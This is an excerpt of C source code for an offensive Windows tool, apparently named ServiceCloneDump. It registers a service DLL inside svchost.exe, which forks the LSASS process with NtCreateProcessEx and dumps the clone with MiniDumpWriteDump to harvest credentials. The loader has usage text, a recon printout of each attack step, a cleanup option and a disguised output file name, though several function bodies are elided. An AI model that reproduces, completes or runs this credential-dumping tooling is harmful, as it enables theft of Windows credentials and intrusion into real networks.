/*
 * SvchostLoader.exe — Registers and launches SvcCloneDll inside svchost.exe
 *
 * Technique: Register a custom service DLL hosted by svchost.exe.
 *            The DLL forks LSASS using NtCreateProcessEx and dumps the clone.
 *
 * Flow:
 *   1. Create registry entries for a new svchost-hosted service
 *   2. Add svchost service group
 *   3. Start the service → svchost.exe loads our DLL → forks & dumps LSASS
 *   4. Wait for dump completion
 *   5. Cleanup (--cleanup flag)
 *
 * Usage:
 *   SvchostLoader.exe --dump --out C:\path\to\output.dmp [--dll C:\path\to\SvcCloneDll.dll]
...
// ============================================================
// Configuration — must match SvcCloneDll.cpp
// ============================================================
...
static BOOL StartDumpService() {
    ...
    printf("[*] DLL will fork LSASS via NtCreateProcessEx and dump the clone\n");
...
// ============================================================
static void DoRecon() {
    printf("=== ServiceCloneDump Recon ===\n\n");

    printf("[*] Technique: Register DLL as svchost.exe-hosted service\n");
    printf("[*] DLL forks LSASS via NtCreateProcessEx, dumps the clone\n\n");
    ...
    printf("    6. DLL forks LSASS via NtCreateProcessEx → clone process\n");
    printf("    7. MiniDumpWriteDump on the clone → credential dump\n");
    printf("    8. Clone is terminated, service self-stops\n\n");
...
static void PrintUsage(const char *exe) {
    printf("ServiceCloneDump — LSASS dump via svchost.exe service DLL + process fork\n\n");
    printf("Usage:\n");
    ...
    printf("  --dll <path>   Path to SvcCloneDll.dll (default: same directory as loader)\n");
    printf("\nExample:\n");
    printf("  %s --dump --out C:\\Windows\\Temp\\debug.dmp --dll C:\\path\\to\\SvcCloneDll.dll\n", exe);
}
...
int main(int argc, char *argv[]) {
    ...
    if (doDump) {
        ...
        if (dllPath[0] == 0) {
            ...
            if (lastSlash) {
                lastSlash[1] = '\0';
                strcat_s(exePath, "SvcCloneDll.dll");
        ...
        if (GetFileAttributesA(dllPath) == INVALID_FILE_ATTRIBUTES) {
            ...
            printf("[-] Build SvcCloneDll.dll and place it next to this exe, or use --dll\n");
            return 1;
        }
        ...
        printf("=== ServiceCloneDump — svchost.exe Service DLL + Process Fork ===\n\n");
        printf("[*] DLL:  %s\n", dllPath);
        printf("[*] Dump: %s\n\n", outPath);
